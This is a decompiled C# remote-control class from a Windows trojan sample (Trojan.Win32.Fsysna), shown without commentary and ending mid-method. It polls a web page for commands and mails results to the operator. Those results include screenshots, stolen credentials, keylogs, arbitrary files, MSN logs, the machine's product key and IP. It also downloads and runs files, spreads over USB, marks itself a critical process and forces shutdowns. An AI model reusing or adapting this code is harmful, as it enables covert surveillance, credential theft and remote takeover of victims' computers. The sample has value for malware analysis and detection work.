// Decompiled with JetBrains decompiler
// Type: Project_Unamed.Remote
// Assembly: Project Unnamed, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E14D2CAF-643A-42A5-AF85-1F02787E6112
// Assembly location: C:\Users\Administrateur\Desktop\Virusshare-00005-msil\Trojan.Win32.Fsysna.dkho-1e6991871b0b19bec231c68029dfc8a762f32ed88d5a1aa5b922eb829ff10319.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using Project_Unamed.My;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net.Mail;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;

namespace Project_Unamed
{
  public class Remote
  {
    private static string LastCommand = "";

    [DebuggerNonUserCode]
    public Remote()
    {
    }

    private static bool UserCheck(string Command) => !Command.Contains("|") || Operators.CompareString(Command.Substring(checked (Command.IndexOf("|") + 1)).Trim(), Environment.UserName, false) == 0;

    private static List<string> GetParas(string input)
    {
      string str1 = input;
      List<string> paras = new List<string>();
      if (str1.Contains("$") & str1.Contains("@"))
      {
        string str2 = str1.Substring(checked (str1.IndexOf("$") + 1), checked (str1.IndexOf("@") - str1.IndexOf("$") - 1));
        string str3 = !str1.Contains("|") ? str1.Substring(checked (str1.IndexOf("@") + 1)) : str1.Substring(checked (str1.IndexOf("@") + 1), checked (str1.IndexOf("|") - str1.IndexOf("@") - 1));
        paras.Add(str2.Trim());
        paras.Add(str3.Trim());
      }
      else if (str1.Contains("$") & !str1.Contains("@"))
      {
        string str4 = !str1.Contains("|") ? str1.Substring(checked (str1.IndexOf("$") + 1)) : str1.Substring(checked (str1.IndexOf("$") + 1), checked (str1.IndexOf("|") - str1.IndexOf("$") - 1));
        paras.Add(str4.Trim());
      }
      return paras;
    }

    private static string GetCommand(string t) => t.Substring(0, t.IndexOf("|END"));

    public static void Initialize()
    {
      EventLogger.LogEvent("Initializing remote control...", "Remote Control");
      Remote.LoadLastCommand();
      Remote.StartCheckLoop();
      Remote.SendOnlineMail();
    }

    private static void SendOnlineMail() => Mailer.Send("Username: " + Environment.UserName + "\r\nMachine Name: " + Environment.MachineName + "\r\nOS: " + MyProject.Computer.Info.OSFullName + "\r\nWindows Productkey: " + Functions.GetWindowsProductKey() + "\r\nIp: " + Functions.GetIP(), Settings.MailStart + "Online");

    private static void StartCheckLoop()
    {
      EventLogger.LogEvent("Starting checkloop...", "Remote Control");
      new Thread(new ThreadStart(Remote.CheckLoop)).Start();
    }

    private static void CheckLoop()
    {
      while (true)
      {
        try
        {
          string command = Remote.GetCommand(Functions.GetWebpage());
          List<string> paras = Remote.GetParas(command);
          if (Operators.CompareString(command, Remote.LastCommand, false) != 0)
          {
            if (Remote.UserCheck(command))
            {
              try
              {
                if (command.StartsWith("EventLog$"))
                  EventLogger.SendEventLog();
                else if (command.StartsWith("Get$Scr"))
                  Mailer.Send("Screenshot " + DateTime.Today.ToShortDateString() + " " + Conversions.ToString(DateAndTime.TimeOfDay), Settings.MailStart + "Screenshot", (Stream) Functions.GetScreenshot(), "Screen.jpg");
                else if (command.StartsWith("Get$Stealers"))
                  Mailer.Send("Stealers " + DateTime.Today.ToShortDateString() + " " + Conversions.ToString(DateAndTime.TimeOfDay) + "\r\n\r\n" + Stealers.GetAll(), Settings.MailStart + "Stealers");
                else if (command.StartsWith("Kill$"))
                {
                  try
                  {
                    string Expression = paras[0];
                    if (Versioned.IsNumeric((object) Expression))
                    {
                      Functions.KillProcess(Conversions.ToInteger(Expression));
                      Mailer.Send("Process Killer " + DateTime.Today.ToShortDateString() + " " + Conversions.ToString(DateAndTime.TimeOfDay) + "\r\nProcess with PID: " + Expression + ", is succesfully terminated!", Settings.MailStart + "Process Killer");
                    }
                  }
                  catch (Exception ex1)
                  {
                    ProjectData.SetProjectError(ex1);
                    Exception exception = ex1;
                    string str = "Unable to get PID";
                    try
                    {
                      str = paras[0];
                    }
                    catch (Exception ex2)
                    {
                      ProjectData.SetProjectError(ex2);
                      ProjectData.ClearProjectError();
                    }
                    Mailer.Send("Process Killer " + DateTime.Today.ToShortDateString() + " " + Conversions.ToString(DateAndTime.TimeOfDay) + "\r\nFailed to terminate process with PID: " + str + "\r\nError: " + exception.GetType().ToString(), Settings.MailStart + "Process Killer");
                    ProjectData.ClearProjectError();
                  }
                }
                else if (command.StartsWith("Online$"))
                  Remote.SendOnlineMail();
                else if (command.StartsWith("Get$ProcLst"))
                  Mailer.Send("Process List " + DateTime.Today.ToShortDateString() + " " + Conversions.ToString(DateAndTime.TimeOfDay) + "\r\n" + Functions.ProcessList(), Settings.MailStart + "Process List");
                else if (command.StartsWith("Read$"))
                {
                  try
                  {
                    string path = paras[0];
                    string str = File.ReadAllText(path);
                    Mailer.Send("File Reader " + DateTime.Today.ToShortDateString() + " " + Conversions.ToString(DateAndTime.TimeOfDay) + "\r\nFilename: " + path + "\r\nContent: \r\n" + str, Settings.MailStart + "File Reader");
                  }
                  catch (Exception ex)
                  {
                    ProjectData.SetProjectError(ex);
                    Mailer.Send("Error in reading file [" + paras[0] + "]. Please check the file path for spelling errors.", Settings.MailStart + "File Reader");
                    ProjectData.ClearProjectError();
                  }
                }
                else if (command.StartsWith("Write$"))
                {
                  try
                  {
                    string path = paras[0];
                    string contents = paras[1];
                    if (File.Exists(path))
                    {
                      Mailer.Send("File Writer " + DateTime.Today.ToShortDateString() + " " + Conversions.ToString(DateAndTime.TimeOfDay) + "\r\nUnable to write file because it already exists. Please delete the file with the Delete$<Path> function.", Settings.MailStart + "File Writer");
                    }
                    else
                    {
                      try
                      {
                        File.WriteAllText(path, contents);
                        Mailer.Send("File Writer " + DateTime.Today.ToShortDateString() + " " + Conversions.ToString(DateAndTime.TimeOfDay) + "\r\nFile succesfully created!.", Settings.MailStart + "File Writer");
                      }
                      catch (Exception ex)
                      {
                        ProjectData.SetProjectError(ex);
                        Exception exception = ex;
                        Mailer.Send("File Writer " + DateTime.Today.ToShortDateString() + " " + Conversions.ToString(DateAndTime.TimeOfDay) + "\r\nUnable to write file. Unkown error. Error follows: [" + exception.GetType().ToString() + "]", Settings.MailStart + "File Writer");
                        ProjectData.ClearProjectError();
                      }
                    }
                  }
                  catch (Exception ex)
                  {
                    ProjectData.SetProjectError(ex);
                    Exception exception = ex;
                    Mailer.Send("File Writer " + DateTime.Today.ToShortDateString() + " " + Conversions.ToString(DateAndTime.TimeOfDay) + "\r\nUnable to write file. Unkown error. Error follows: [" + exception.GetType().ToString() + "]", Settings.MailStart + "File Writer");
                    ProjectData.ClearProjectError();
                  }
                }
                else if (command.StartsWith("DownloadFile$"))
                {
                  try
                  {
                    MyProject.Computer.Network.DownloadFile(paras[0], paras[1]);
                    Mailer.Send("File Downloader " + DateTime.Today.ToShortDateString() + " " + Conversions.ToString(DateAndTime.TimeOfDay) + "\r\nFile downloaded.", Settings.MailStart + "File Downloader");
                  }
                  catch (Exception ex3)
                  {
                    ProjectData.SetProjectError(ex3);
                    Exception exception = ex3;
                    string str1 = "Unable to get url";
                    string str2 = "Unable to get filepath";
                    try
                    {
                      str1 = paras[0];
                      str2 = paras[1];
                    }
                    catch (Exception ex4)
                    {
                      ProjectData.SetProjectError(ex4);
                      ProjectData.ClearProjectError();
                    }
                    Mailer.Send("File Downloader " + DateTime.Today.ToShortDateString() + " " + Conversions.ToString(DateAndTime.TimeOfDay) + "\r\nUnable to download file. Error follows: " + exception.GetType().ToString() + ".\r\n\r\nUrl: " + str1 + "\r\nFile: " + str2, Settings.MailStart + "File Downloader");
                    ProjectData.ClearProjectError();
                  }
                }
                else if (command.StartsWith("SendFile$"))
                {
                  try
                  {
                    string fileName = paras[0];
                    string name = new FileInfo(fileName).Name;
                    Mailer.Send("File Sender " + DateTime.Today.ToShortDateString() + " " + Conversions.ToString(DateAndTime.TimeOfDay) + "\r\nSuccesfully sent " + name + ".", Settings.MailStart + "File Sender", new Attachment(fileName));
                  }
                  catch (Exception ex5)
                  {
                    ProjectData.SetProjectError(ex5);
                    Exception exception = ex5;
                    string fileName = "Unable to get parameter";
                    string str = "Unable to get parameter";
                    try
                    {
                      fileName = paras[0];
                      str = new FileInfo(fileName).Name;
                    }
                    catch (Exception ex6)
                    {
                      ProjectData.SetProjectError(ex6);
                      ProjectData.ClearProjectError();
                    }
                    Mailer.Send("File Sender " + DateTime.Today.ToShortDateString() + " " + Conversions.ToString(DateAndTime.TimeOfDay) + "\r\nError occured: " + exception.GetType().ToString() + " while sending '" + str + "[ " + fileName + " ]'", Settings.MailStart + "File Sender");
                    ProjectData.ClearProjectError();
                  }
                }
                else if (command.StartsWith("Delete$"))
                {
                  try
                  {
                    string str = paras[0];
                    Mailer.Send("File Deleter " + DateTime.Today.ToShortDateString() + " " + Conversions.ToString(DateAndTime.TimeOfDay) + "\r\nFile succesfully deleted.", Settings.MailStart + "File Deleter");
                  }
                  catch (Exception ex)
                  {
                    ProjectData.SetProjectError(ex);
                    Exception exception = ex;
                    Mailer.Send("File Deleter " + DateTime.Today.ToShortDateString() + " " + Conversions.ToString(DateAndTime.TimeOfDay) + "\r\nError while deleting file, Error follows: " + exception.GetType().ToString(), Settings.MailStart + "File Deleter");
                    ProjectData.ClearProjectError();
                  }
                }
                else if (command.StartsWith("Url$"))
                {
                  string fileName = "Unable to get url";
                  try
                  {
                    fileName = paras[0];
                    Process.Start(fileName);
                    Mailer.Send("Url Opener " + DateTime.Today.ToShortDateString() + " " + Conversions.ToString(DateAndTime.TimeOfDay) + "\r\nUrl succefully opened [ " + fileName + " ]", Settings.MailStart + "Url Opener");
                  }
                  catch (Exception ex)
                  {
                    ProjectData.SetProjectError(ex);
                    Exception exception = ex;
                    Mailer.Send("Url Opener " + DateTime.Today.ToShortDateString() + " " + Conversions.ToString(DateAndTime.TimeOfDay) + "\r\nError while opening [ " + fileName + " ], Error follows: " + exception.GetType().ToString(), Settings.MailStart + "Url Opener");
                    ProjectData.ClearProjectError();
                  }
                }
                else if (command.StartsWith("Open$"))
                {
                  string fileName = "Unable to get filename";
                  try
                  {
                    fileName = paras[0];
                    Process.Start(fileName);
                    Mailer.Send("File Opener " + DateTime.Today.ToShortDateString() + " " + Conversions.ToString(DateAndTime.TimeOfDay) + "\r\nFile succefully opened [ " + fileName + " ]", Settings.MailStart + "File Opener");
                  }
                  catch (Exception ex)
                  {
                    ProjectData.SetProjectError(ex);
                    Exception exception = ex;
                    Mailer.Send("File Opener " + DateTime.Today.ToShortDateString() + " " + Conversions.ToString(DateAndTime.TimeOfDay) + "\r\nError while opening [ " + fileName + " ], Error follows: " + exception.GetType().ToString(), Settings.MailStart + "File Opener");
                    ProjectData.ClearProjectError();
                  }
                }
                else if (command.StartsWith("OpenShell$"))
                {
                  string PathName = "Unable to get filename";
                  try
                  {
                    PathName = paras[0];
                    Interaction.Shell(PathName);
                    Mailer.Send("File Opener " + DateTime.Today.ToShortDateString() + " " + Conversions.ToString(DateAndTime.TimeOfDay) + "\r\n(ShellMethod)File succefully opened [ " + PathName + " ]", Settings.MailStart + "File Opener");
                  }
                  catch (Exception ex)
                  {
                    ProjectData.SetProjectError(ex);
                    Exception exception = ex;
                    Mailer.Send("File Opener " + DateTime.Today.ToShortDateString() + " " + Conversions.ToString(DateAndTime.TimeOfDay) + "\r\n(ShellMethod)Error while opening [ " + PathName + " ], Error follows: " + exception.GetType().ToString(), Settings.MailStart + "File Opener");
                    ProjectData.ClearProjectError();
                  }
                }
                else if (command.StartsWith("Dir$"))
                {
                  string path = "Unable to find dir";
                  try
                  {
                    path = paras[0];
                    string str3 = "Directory content: \r\n\r\n";
                    string[] files = Directory.GetFiles(path);
                    int index1 = 0;
                    while (index1 < files.Length)
                    {
                      string str4 = files[index1];
                      str3 = str3 + str4 + "\r\n";
                      checked { ++index1; }
                    }
                    string[] directories = Directory.GetDirectories(path);
                    int index2 = 0;
                    while (index2 < directories.Length)
                    {
                      string str5 = directories[index2];
                      str3 = str3 + "***DIR :  " + str5 + "\r\n";
                      checked { ++index2; }
                    }
                    Mailer.Send("Directory Explorer " + DateTime.Today.ToShortDateString() + " " + Conversions.ToString(DateAndTime.TimeOfDay) + "\r\n" + str3, Settings.MailStart + "Directory Explorer");
                  }
                  catch (Exception ex)
                  {
                    ProjectData.SetProjectError(ex);
                    Exception exception = ex;
                    Mailer.Send("Directory Explorer " + DateTime.Today.ToShortDateString() + " " + Conversions.ToString(DateAndTime.TimeOfDay) + "\r\nError while explorering '" + path + "' please check to path for spellings errors and try again\r\n\r\nError: " + exception.GetType().ToString(), Settings.MailStart + "Directory Explorer");
                    ProjectData.ClearProjectError();
                  }
                }
                else if (command.StartsWith("Get$KeyLog"))
                  Keylogger.SendLog();
                else if (command.StartsWith("MkDir$"))
                {
                  string Path = "Unable to find dir";
                  try
                  {
                    Path = paras[0];
                    FileSystem.MkDir(Path);
                    Mailer.Send("Directory Maker " + DateTime.Today.ToShortDateString() + " " + Conversions.ToString(DateAndTime.TimeOfDay) + "\r\nSuccesfully created '" + Path + "'", Settings.MailStart + "Directory Maker");
                  }
                  catch (Exception ex)
                  {
                    ProjectData.SetProjectError(ex);
                    Exception exception = ex;
                    Mailer.Send("Directory Maker " + DateTime.Today.ToShortDateString() + " " + Conversions.ToString(DateAndTime.TimeOfDay) + "\r\nError while making '" + Path + "' please check to path for spellings errors and try again\r\n\r\nError: " + exception.GetType().ToString(), Settings.MailStart + "Directory Maker");
                    ProjectData.ClearProjectError();
                  }
                }
                else if (command.StartsWith("RmDir$"))
                {
                  string Path = "Unable to find dir";
                  try
                  {
                    Path = paras[0];
                    FileSystem.RmDir(Path);
                    Mailer.Send("Directory Remover " + DateTime.Today.ToShortDateString() + " " + Conversions.ToString(DateAndTime.TimeOfDay) + "\r\nSuccesfully deleted '" + Path + "'", Settings.MailStart + "Directory Remover");
                  }
                  catch (Exception ex)
                  {
                    ProjectData.SetProjectError(ex);
                    Exception exception = ex;
                    Mailer.Send("Directory Remover " + DateTime.Today.ToShortDateString() + " " + Conversions.ToString(DateAndTime.TimeOfDay) + "\r\nError while deleted '" + Path + "' please check to path for spellings errors and try again\r\n\r\nError: " + exception.GetType().ToString(), Settings.MailStart + "Directory Remover");
                    ProjectData.ClearProjectError();
                  }
                }
                else if (command.StartsWith("CopyFile$"))
                {
                  string sourceFileName = "Unable to get file";
                  string destFileName = "Unable to get destination";
                  try
                  {
                    sourceFileName = paras[0];
                    destFileName = paras[1];
                    File.Copy(sourceFileName, destFileName);
                    Mailer.Send("File Copier " + DateTime.Today.ToShortDateString() + " " + Conversions.ToString(DateAndTime.TimeOfDay) + "\r\nFile succesfully copied!", Settings.MailStart + "File Copier");
                  }
                  catch (Exception ex)
                  {
                    ProjectData.SetProjectError(ex);
                    Exception exception = ex;
                    Mailer.Send("File Copier " + DateTime.Today.ToShortDateString() + " " + Conversions.ToString(DateAndTime.TimeOfDay) + "\r\nUnable to copy file! File: " + sourceFileName + "  Destination: " + destFileName + "   Errror: " + exception.GetType().ToString(), Settings.MailStart + "File Copier");
                    ProjectData.ClearProjectError();
                  }
                }
                else if (command.StartsWith("MoveFile$"))
                {
                  string sourceFileName = "Unable to get file";
                  string destFileName = "Unable to get destination";
                  try
                  {
                    sourceFileName = paras[0];
                    destFileName = paras[1];
                    File.Move(sourceFileName, destFileName);
                    Mailer.Send("File Mover " + DateTime.Today.ToShortDateString() + " " + Conversions.ToString(DateAndTime.TimeOfDay) + "\r\nFile succesfully moved!", Settings.MailStart + "File Mover");
                  }
                  catch (Exception ex)
                  {
                    ProjectData.SetProjectError(ex);
                    Exception exception = ex;
                    Mailer.Send("File Mover " + DateTime.Today.ToShortDateString() + " " + Conversions.ToString(DateAndTime.TimeOfDay) + "\r\nUnable to Move file! File: " + sourceFileName + "  Destination: " + destFileName + "   Errror: " + exception.GetType().ToString(), Settings.MailStart + "File Mover");
                    ProjectData.ClearProjectError();
                  }
                }
                else if (command.StartsWith("Do$Shutdown"))
                {
                  Mailer.Send("System Shutdown " + DateTime.Today.ToShortDateString() + " " + Conversions.ToString(DateAndTime.TimeOfDay) + "\r\nSystem is going down...", Settings.MailStart + "System Shutdown");
                  Interaction.Shell("Shutdown -s -t 00");
                }
                else if (command.StartsWith("Do$Restart"))
                {
                  Mailer.Send("System Restart " + DateTime.Today.ToShortDateString() + " " + Conversions.ToString(DateAndTime.TimeOfDay) + "\r\nSystem is restarting...", Settings.MailStart + "System Restart");
                  Interaction.Shell("Shutdown -r -t 00");
                }
                else if (command.StartsWith("Do$Logoff"))
                {
                  Mailer.Send("System Logoff " + DateTime.Today.ToShortDateString() + " " + Conversions.ToString(DateAndTime.TimeOfDay) + "\r\nSystem is logging off...", Settings.MailStart + "System logoff");
                  Interaction.Shell("Shutdown -l -t 00");
                }
                else if (command.StartsWith("Do$Destroy"))
                {
                  Mailer.Send("Server Destroy " + DateTime.Today.ToShortDateString() + " " + Conversions.ToString(DateAndTime.TimeOfDay) + "\r\nGoodbye. :'(", Settings.MailStart + "Server Destroy");
                  UndetectManager.TerminateWatcher();
                  UndetectManager.TerminteRegisteryW();
                  Process[] processes = Process.GetProcesses();
                  int index = 0;
                  while (index < processes.Length)
                  {
                    Process process = processes[index];
                    try
                    {
                      if (Operators.CompareString(process.Modules[0].FileName, Settings.InstallationAntiKillFile, false) == 0)
                        process.Kill();
                    }
                    catch (Exception ex)
                    {
                      ProjectData.SetProjectError(ex);
                      ProjectData.ClearProjectError();
                    }
                    checked { ++index; }
                  }
                  Thread.Sleep(1000);
                  try
                  {
                    File.Delete(Settings.InstallationAntiKillFile);
                  }
                  catch (Exception ex)
                  {
                    ProjectData.SetProjectError(ex);
                    ProjectData.ClearProjectError();
                  }
                  try
                  {
                    RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                    registryKey.DeleteSubKey(Settings.RegisteryName);
                    registryKey.Close();
                  }
                  catch (Exception ex)
                  {
                    ProjectData.SetProjectError(ex);
                    ProjectData.ClearProjectError();
                  }
                  Process.GetCurrentProcess().Kill();
                }
                else if (command.StartsWith("MessageB$"))
                {
                  try
                  {
                    Remote.ShowMessagebox(paras[0]);
                    Mailer.Send("Messagesboxer " + DateTime.Today.ToShortDateString() + " " + Conversions.ToString(DateAndTime.TimeOfDay) + "\r\nMessagebox succesfull", Settings.MailStart + "Messageboxer");
                  }
                  catch (Exception ex)
                  {
                    ProjectData.SetProjectError(ex);
                    Exception exception = ex;
                    Mailer.Send("Messagesboxer " + DateTime.Today.ToShortDateString() + " " + Conversions.ToString(DateAndTime.TimeOfDay) + "\r\nUnable to show messagebox because of this error: " + exception.GetType().ToString(), Settings.MailStart + "Messageboxer");
                    ProjectData.ClearProjectError();
                  }
                }
                else if (command.StartsWith("InpBox$"))
                {
                  try
                  {
                    string inp = paras[0];
                    Mailer.Send("Inputboxer " + DateTime.Today.ToShortDateString() + " " + Conversions.ToString(DateAndTime.TimeOfDay) + "\r\nInputbox succesfull, waiting for response", Settings.MailStart + "Inputboxer");
                    Remote.ShowInputbox(inp);
                  }
                  catch (Exception ex)
                  {
                    ProjectData.SetProjectError(ex);
                    Exception exception = ex;
                    Mailer.Send("Inputboxer " + DateTime.Today.ToShortDateString() + " " + Conversions.ToString(DateAndTime.TimeOfDay) + "\r\nUnable to show inputbox because of this error: " + exception.GetType().ToString(), Settings.MailStart + "Inputboxer");
                    ProjectData.ClearProjectError();
                  }
                }
                else if (command.StartsWith("Speak$"))
                {
                  try
                  {
                    Remote.Speak(paras[0]);
                  }
                  catch (Exception ex)
                  {
                    ProjectData.SetProjectError(ex);
                    Exception exception = ex;
                    Mailer.Send("Speaker " + DateTime.Today.ToShortDateString() + " " + Conversions.ToString(DateAndTime.TimeOfDay) + "\r\nUnable to speak because of this error: " + exception.GetType().ToString(), Settings.MailStart + "Speaker");
                    ProjectData.ClearProjectError();
                  }
                }
                else if (command.StartsWith("CdDoor$"))
                {
                  try
                  {
                    string str = paras[0];
                    if (Operators.CompareString(str.ToLower(), "open", false) == 0)
                    {
                      Functions.OpenCDDoor();
                      Mailer.Send("CdDoor Controller " + DateTime.Today.ToShortDateString() + " " + Conversions.ToString(DateAndTime.TimeOfDay) + "\r\nCddoor open!", Settings.MailStart + "CdDoor Controller");
                    }
                    else if (Operators.CompareString(str.ToLower(), "close", false) == 0)
                    {
                      Functions.CloseCDDoor();
                      Mailer.Send("CdDoor Controller " + DateTime.Today.ToShortDateString() + " " + Conversions.ToString(DateAndTime.TimeOfDay) + "\r\nCddoor closed!", Settings.MailStart + "CdDoor Controller");
                    }
                    else
                      Mailer.Send("CdDoor Controller " + DateTime.Today.ToShortDateString() + " " + Conversions.ToString(DateAndTime.TimeOfDay) + "\r\nNo valid cd parameter given choose between open/close", Settings.MailStart + "CdDoor Controller");
                  }
                  catch (Exception ex)
                  {
                    ProjectData.SetProjectError(ex);
                    Exception exception = ex;
                    Mailer.Send("CdDoor Controller " + DateTime.Today.ToShortDateString() + " " + Conversions.ToString(DateAndTime.TimeOfDay) + "\r\nUnable to open cd door because of this error: " + exception.GetType().ToString(), Settings.MailStart + "CdDoor Controller");
                    ProjectData.ClearProjectError();
                  }
                }
                else if (command.StartsWith("LCDOff$"))
                {
                  try
                  {
                    Functions.TurnOffLCD();
                    Mailer.Send("LCD Controller " + DateTime.Today.ToShortDateString() + " " + Conversions.ToString(DateAndTime.TimeOfDay) + "\r\nLCD screen off!", Settings.MailStart + "LCD Controller");
                  }
                  catch (Exception ex)
                  {
                    ProjectData.SetProjectError(ex);
                    Exception exception = ex;
                    Mailer.Send("LCD Controller " + DateTime.Today.ToShortDateString() + " " + Conversions.ToString(DateAndTime.TimeOfDay) + "\r\nUnable to turn lcd off because of this error: " + exception.GetType().ToString(), Settings.MailStart + "LCD Controller");
                    ProjectData.ClearProjectError();
                  }
                }
                else if (command.StartsWith("SysProc$"))
                {
                  try
                  {
                    string str = paras[0];
                    if (Operators.CompareString(str.ToLower(), "true", false) == 0)
                      CriticalProcess.ProtectProcess(true);
                    else if (Operators.CompareString(str.ToLower(), "false", false) == 0)
                      CriticalProcess.ProtectProcess(false);
                    else
                      Mailer.Send("Process Criticaler " + DateTime.Today.ToShortDateString() + " " + Conversions.ToString(DateAndTime.TimeOfDay) + "\r\nPlease select true/false", Settings.MailStart + "Process Criticaler");
                    Mailer.Send("Process Criticaler " + DateTime.Today.ToShortDateString() + " " + Conversions.ToString(DateAndTime.TimeOfDay) + "\r\nProcess critical setting : " + str, Settings.MailStart + "Process Criticaler");
                  }
                  catch (Exception ex)
                  {
                    ProjectData.SetProjectError(ex);
                    Mailer.Send("Process Criticaler " + DateTime.Today.ToShortDateString() + " " + Conversions.ToString(DateAndTime.TimeOfDay) + "\r\nUnable to make the process critical!", Settings.MailStart + "Process Criticaler");
                    ProjectData.ClearProjectError();
                  }
                }
                else if (command.StartsWith("UsbSpread$"))
                {
                  try
                  {
                    string str = USBSpread.Spread();
                    Mailer.Send("Usb Spreader " + DateTime.Today.ToShortDateString() + " " + Conversions.ToString(DateAndTime.TimeOfDay) + "\r\nUsb Spreader succesfully spread! Log:" + str, Settings.MailStart + "Usb Spreader");
                  }
                  catch (Exception ex)
                  {
                    ProjectData.SetProjectError(ex);
                    Exception exception = ex;
                    Mailer.Send("Usb Spreader " + DateTime.Today.ToShortDateString() + " " + Conversions.ToString(DateAndTime.TimeOfDay) + "\r\nUsb Spreader failed to spread! Error:" + exception.GetType().ToString(), Settings.MailStart + "Usb Spreader");
                    ProjectData.ClearProjectError();
                  }
                }
                else if (command.StartsWith("ListDrivers$"))
                {
                  try
                  {
                    Mailer.Send("Driver Lister " + DateTime.Today.ToShortDateString() + " " + Conversions.ToString(DateAndTime.TimeOfDay) + "\r\nDriver lister failed! Driver list:\r\n" + Functions.DriverList(), Settings.MailStart + "Driver Lister");
                  }
                  catch (Exception ex)
                  {
                    ProjectData.SetProjectError(ex);
                    Exception exception = ex;
                    Mailer.Send("Driver Lister " + DateTime.Today.ToShortDateString() + " " + Conversions.ToString(DateAndTime.TimeOfDay) + "\r\nDriver lister failed! Error:" + exception.GetType().ToString(), Settings.MailStart + "Driver Lister");
                    ProjectData.ClearProjectError();
                  }
                }
                else if (command.StartsWith("ChangeBckGound$"))
                {
                  try
                  {
                    Remote.ChangeBCK(paras[0]);
                  }
                  catch (Exception ex)
                  {
                    ProjectData.SetProjectError(ex);
                    Exception exception = ex;
                    Mailer.Send("Background Changer " + DateTime.Today.ToShortDateString() + " " + Conversions.ToString(DateAndTime.TimeOfDay) + "\r\nFailed to changed background, Error: " + exception.GetType().ToString(), Settings.MailStart + "Background Changer");
                    ProjectData.ClearProjectError();
                  }
                }
                else if (command.StartsWith("RestartServer$"))
                {
                  Mailer.Send("Server Restarter " + DateTime.Today.ToShortDateString() + " " + Conversions.ToString(DateAndTime.TimeOfDay) + "\r\nServer restarting...", Settings.MailStart + "Server Restarter");
                  Functions.Restart();
                }
                else if (command.StartsWith("ParseMsn$"))
                {
                  string Filename = "Unable to get path";
                  try
                  {
                    Filename = paras[0];
                    MemoryStream ioattachment = new MemoryStream(Encoding.ASCII.GetBytes(Functions.ParseMSNLogFile(Filename)));
                    Mailer.Send("Msn Log Praser " + DateTime.Today.ToShortDateString() + " " + Conversions.ToString(DateAndTime.TimeOfDay) + "\r\nMsn log in attachment.", Settings.MailStart + "Msn Log Praser", (Stream) ioattachment, "msn.txt");
                  }
                  catch (Exception ex)
                  {
                    ProjectData.SetProjectError(ex);
                    Exception exception = ex;
                    Mailer.Send("Msn Log Praser " + DateTime.Today.ToShortDateString() + " " + Conversions.ToString(DateAndTime.TimeOfDay) + "\r\nUnable to prase msn log [" + Filename + "], Error: " + exception.GetType().ToString(), Settings.MailStart + "Msn Log Praser");
                    ProjectData.ClearProjectError();
                  }
                }
              }
              catch (Exception ex)
              {
                ProjectData.SetProjectError(ex);
                Exception exception = ex;
                Mailer.Send("Unhandled Error " + DateTime.Today.ToShortDateString() + " " + Conversions.ToString(DateAndTime.TimeOfDay) + "\r\nError while handeling the command '" + command + "'. \r\nError: " + exception.GetType().ToString() + "\r\nProgram is recovered form error and running normally again:D.", Settings.MailStart + "Unhandled Error");
                ProjectData.ClearProjectError();
              }
            }
            Remote.LastCommand = command;
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          EventLogger.LogEvent("Unable to read command from external host. Rechecking in " + Conversions.ToString(Conversions.ToDouble(Settings.CheckDelay) / 60000.0) + " minutes.", "Remote Control");
          ProjectData.ClearProjectError();
        }
        Thread.Sleep(Conversions.ToInteger(Settings.CheckDelay));
      }
    }

    private static void ChangeBCK(string url) => new Thread((ParameterizedThreadStart) (a0 => Remote.ChangeBCK_(Conversions.ToString(a0)))).Start((object) url);

    private static void ChangeBCK_(string url)
    {
      try
      {
        if (File.Exists(Interaction.Environ("TMP") + "\\Image.bmp"))
          File.Delete(Interaction.Environ("TMP") + "\\Image.bmp");
        MyProject.Computer.Network.DownloadFile(url, Interaction.Environ("TMP") + "\\Image.bmp");
        Functions.SystemParametersInfo(20, 0, Interaction.Environ("TMP") + "\\Image.bmp", 3);
        Mailer.Send("Background Changer " + DateTime.Today.ToShortDateString() + " " + Conversions.ToString(DateAndTime.TimeOfDay) + "\r\nBackground changed!", Settings.MailStart + "Background Changer");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        Exception exception = ex;
        Mailer.Send("Background Changer " + DateTime.Today.ToShortDateString() + " " + Conversions.ToString(DateAndTime.TimeOfDay) + "\r\nFailed to changed background, Error: " + exception.GetType().ToString(), Settings.MailStart + "Background Changer");
        ProjectData.ClearProjectError();
      }
    }

    private static void SpeakThread(string Speak)
    {
      try
      {
        object objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("SAPI.spvoice"));
        object[] objArray = new object[1]{ (object) Speak };
        object[] Arguments = objArray;
        bool[] flagArray = new bool[1]{ true };
        bool[] CopyBack = flagArray;
        NewLateBinding.LateCall(objectValue, (Type) null, nameof (Speak), Arguments, (string[]) null, (Type[]) null, CopyBack, true);
        if (!flagArray[0])
          return;
        Speak = (string) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray[0]), typeof (string));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        Exception exception = ex;
        Mailer.Send("Speaker " + DateTime.Today.ToShortDateString() + " " + Conversions.ToString(DateAndTime.TimeOfDay) + "\r\nUnable to speak because of this error: " + exception.GetType().ToString(), Settings.MailStart + "Speaker");
        ProjectData.ClearProjectError();
      }
    }

    private static void Speak(string Speak) => new Thread((ParameterizedThreadStart) (a0 => Remote.SpeakThread(Conversions.ToString(a0)))).Start((object) Speak);

    private static void ShowMessagebox(string msg) => new Thread((ParameterizedThreadStart) (a0 => Remote.MsgboxThread(Conversions.ToString(a0)))).Start((object) msg);

    private static void MsgboxThread(string msg)
    {
      int num = (int) Interaction.MsgBox((object) msg, MsgBoxStyle.Critical, (object) "   ");
    }

    private static void ShowInputbox(string inp) => new Thread((ParameterizedThreadStart) (a0 => Remote.InputboxThread(Conversions.ToString(a0)))).Start((object) inp);

    private static void InputboxThread(string inp)
    {
      string str = Interaction.InputBox(inp, "   ");
      Mailer.Send("Input Response " + DateTime.Today.ToShortDateString() + " " + Conversions.ToString(DateAndTime.TimeOfDay) + "\r\nInput response: " + str, Settings.MailStart + "Inputbox response");
    }

    private static void LoadLastCommand()
    {
      try
      {
        Remote.LastCommand = Remote.GetCommand(Functions.GetWebpage());
        EventLogger.LogEvent("Last command loaded.", "Remote Control");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        Remote.LastCommand = "NULL";
